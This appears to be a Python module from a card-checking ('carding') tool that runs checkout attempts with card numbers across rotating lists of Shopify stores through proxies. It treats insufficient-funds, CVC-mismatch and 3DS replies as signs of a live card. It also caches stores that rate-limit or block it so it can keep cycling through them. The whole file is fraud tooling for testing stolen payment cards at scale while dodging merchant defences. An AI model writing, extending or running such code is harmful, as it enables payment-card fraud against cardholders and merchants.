from __future__ import annotations

"""
AutoShopify gate — wraps auto.py (curl_cffi TLS client) directly.
Drops the old HTTP endpoint; all card checks go through run_checkout_for_card.
"""

import random
import threading as _threading
import time as _time

import requests as _requests
import auto
from config import SITE_FILE, SITE_LOW_FILE, SITE_MID_FILE

_SITE_PATHS: dict[str, str] = {
    "random": SITE_FILE,
    "low":    SITE_LOW_FILE,
    "mid":    SITE_MID_FILE,
}


def _country_flag(code: str) -> str:
    try:
        return "".join(chr(0x1F1E6 + ord(c) - ord('A')) for c in code.upper() if 'A' <= c <= 'Z')
    except Exception:
        return ""


# ── Dead-site cache ───────────────────────────────────────────────────────────
_dead_sites: dict[str, float] = {}
_dead_lock  = _threading.Lock()

_PROXY_SIGNS = ("407", "CONNECT tunnel", "libcurl", "Proxy Authentication", "curl: (56)", "curl: (7)")

_SITE_TTL = {
    "returned 429": 600,
    "returned 403": 1800,
    "returned 402": 300,
    "returned 422": 300,
    "returned 404": 86400,
    "could not extract session": 300,
    "curl: (28)": 90,    # connection timeout — short cooldown, may recover
    "Step 0 failed": 90, # any step-0 error marks the site briefly dead
}

# ── Alive-site cache (per tier) ───────────────────────────────────────────────
_alive_sites: dict[str, list[str]] = {}
_alive_dirty: dict[str, bool]      = {t: True for t in _SITE_PATHS}


def _norm_range(site_range: str | None) -> str:
    return site_range if site_range in _SITE_PATHS else "random"


def _rebuild_alive(site_range: str = "random") -> None:
    global _alive_sites, _alive_dirty
    tier = _norm_range(site_range)
    now  = _time.time()
    with _dead_lock:
        expired = [u for u, exp in _dead_sites.items() if exp <= now]
        for u in expired:
            _dead_sites.pop(u, None)
    pool = _base_pool(tier)
    _alive_sites[tier] = [s for s in pool if s not in _dead_sites]
    _alive_dirty[tier] = False


def _is_dead(site_url: str) -> bool:
    exp = _dead_sites.get(site_url)
    if exp is None:
        return False
    if _time.time() < exp:
        return True
    with _dead_lock:
        _dead_sites.pop(site_url, None)
    return False


def _mark_dead(site_url: str, error_str: str) -> None:
    global _alive_dirty
    if not error_str or any(s in error_str for s in _PROXY_SIGNS):
        return
    for pattern, ttl in _SITE_TTL.items():
        if pattern in error_str:
            with _dead_lock:
                _dead_sites[site_url] = _time.time() + ttl
            for t in _SITE_PATHS:
                _alive_dirty[t] = True
            return


def dead_site_count() -> int:
    now = _time.time()
    return sum(1 for exp in _dead_sites.values() if exp > now)


# ── Site lists (random / low / mid) ─────────────────────────────────────────

def _load_sites(path: str) -> list[str]:
    try:
        with open(path, "r", encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        return []

_sites: dict[str, list[str]] = {
    tier: _load_sites(path) for tier, path in _SITE_PATHS.items()
}


def _base_pool(site_range: str = "random") -> list[str]:
    tier = _norm_range(site_range)
    primary = _sites.get(tier) or []
    if primary:
        return primary
    if tier in ("low", "mid"):
        return _sites.get("random") or []
    return []


def reload_sites() -> int:
    global _sites, _alive_dirty
    for tier, path in _SITE_PATHS.items():
        _sites[tier] = _load_sites(path)
        _alive_dirty[tier] = True
    return len(_sites.get("random") or [])


def site_count(site_range: str = "random") -> int:
    return len(_base_pool(site_range))


# ── Gateway response normalization ─────────────────────────────────────────────

_APPROVED_KEYWORDS = (
    "3DS_AUTHENTICATION", "3DS_AUTH", "3DS",
    "AUTHENTICATION_REQUIRED", "ACTIONREQUIRED",
    "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "NOT SUFFICIENT FUNDS",
    "INCORRECT_CVC", "INVALID_CVC", "SECURITY_CODE",
    "CVV", "CVC_MISMATCH",
)
_DECLINED_KEYWORDS = (
    "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR", "GENERIC_ERROR",
    "EXPIRED_CARD", "PICKUP_CARD",
    "LOST_CARD", "STOLEN_CARD", "FRAUD", "CALL_ISSUER",
    "TRANSACTION_NOT_ALLOWED", "PROCESSING_ERROR",
    "PAYMENT_METHOD_NOT_AVAILABLE", "AUTHENTICATION_FAILED",
    "INVALID_NUMBER", "INCORRECT_NUMBER",
)
_INFRA_ERROR_KEYWORDS = (
    "STEP ", "FAILED:", "RETURNED 4", "RETURNED 5", "RETURNED 402",
    "RETURNED 422", "RETURNED 429", "CURL:", "CONNECT TUNNEL",
    "COULD NOT EXTRACT", "COULD NOT", "POLL ", "EXCEEDED 30",
    "PROXY", "TIMEOUT", "TIMED OUT", "INVENTORYRESERVATIONFAILURE",
    "NO SHOPIFY", "SESSION", "LIBCURL",
)


def _exc_text(exc: BaseException | None) -> str:
    if exc is None:
        return ""
    if exc.args and exc.args[0]:
        return str(exc.args[0])
    return str(exc) or ""


def normalize_result(status: str, result_str: str) -> tuple[str, str]:
    """Map gateway text to charged / approved / declined / error."""
    resp = (result_str or "").strip() or "UNKNOWN"
    up   = resp.upper()

    if any(k in up for k in ("ORDER_PLACED", "SUCCESSFULRECEIPT", "PROCESSEDRECEIPT")):
        return "charged", resp
    if any(k in up for k in _APPROVED_KEYWORDS):
        return "approved", resp

    if status == "declined" or any(k in up for k in _DECLINED_KEYWORDS):
        if not any(k in up for k in _INFRA_ERROR_KEYWORDS):
            return "declined", resp

    if status in ("charged", "approved", "declined"):
        return status, resp

    if any(k in up for k in _INFRA_ERROR_KEYWORDS):
        return "error", resp

    if resp != "UNKNOWN":
        return "declined", resp

    return "error", resp


def get_random_site(site_range: str = "random") -> str | None:
    tier = _norm_range(site_range)
    pool = _base_pool(tier)
    if not pool:
        return None
    if _alive_dirty.get(tier, True):
        _rebuild_alive(tier)
    alive = _alive_sites.get(tier) or []
    pick  = alive if alive else pool
    return random.choice(pick)


# ── Proxy helpers ─────────────────────────────────────────────────────────────

def normalize_proxy(proxy: str) -> str:
    return auto.normalize_proxy(proxy)


def validate_proxy(proxy: str) -> bool:
    try:
        purl = auto.normalize_proxy(proxy)
        r = _requests.get(
            "https://api.ipify.org?format=json",
            proxies={"http": purl, "https": purl},
            timeout=8,
        )
        return r.status_code == 200
    except Exception:
        return False


def validate_proxy_info(proxy: str) -> dict | None:
    """Test proxy and return latency + geo info, or None if dead."""
    try:
        purl    = auto.normalize_proxy(proxy)
        session = _requests.Session()
        session.proxies = {'http': purl, 'https': purl}
        t0   = _time.time()
        resp = session.get("https://api.ipify.org?format=json", timeout=10)
        ms   = int((_time.time() - t0) * 1000)
        if resp.status_code != 200:
            return None
        ip = resp.json().get("ip", "")
        geo = {}
        try:
            gr = _requests.get(
                f"http://ip-api.com/json/{ip}?fields=country,countryCode,city",
                timeout=5
            )
            if gr.status_code == 200:
                geo = gr.json()
        except Exception:
            pass
        return {
            "ms":      ms,
            "ip":      ip,
            "country": geo.get("country", "Unknown"),
            "city":    geo.get("city", ""),
            "flag":    _country_flag(geo.get("countryCode", "")),
        }
    except Exception:
        return None


# ── Card checker ──────────────────────────────────────────────────────────────

def check_card(cc: str, site: str, proxy: str) -> dict:
    proxy_url = ""
    try:
        proxy_url = auto.normalize_proxy(proxy)
    except Exception:
        pass

    try:
        res = auto.run_checkout_for_card(site, cc, proxy_url)
    except Exception as e:
        err_msg = str(e).replace("\n", " ")[:150]
        _mark_dead(site, err_msg)
        return {
            "status": "error", "result": err_msg,
            "amount": "0", "site": site, "receipt_url": "", "card": cc,
        }

    status_map = {
        auto.CheckStatus.CHARGED:  "charged",
        auto.CheckStatus.APPROVED: "approved",
        auto.CheckStatus.DECLINED: "declined",
        auto.CheckStatus.ERROR:    "error",
    }
    status = status_map.get(res.status, "error")

    result_str = res.status_code or _exc_text(res.error) or "UNKNOWN"
    status, result_str = normalize_result(status, result_str)

    if status == "error":
        _mark_dead(site, result_str)

    return {
        "status":      status,
        "result":      result_str,
        "amount":      res.amount or "0",
        "site":        site,
        "receipt_url": res.receipt_url or "",
        "card":        cc,
    }
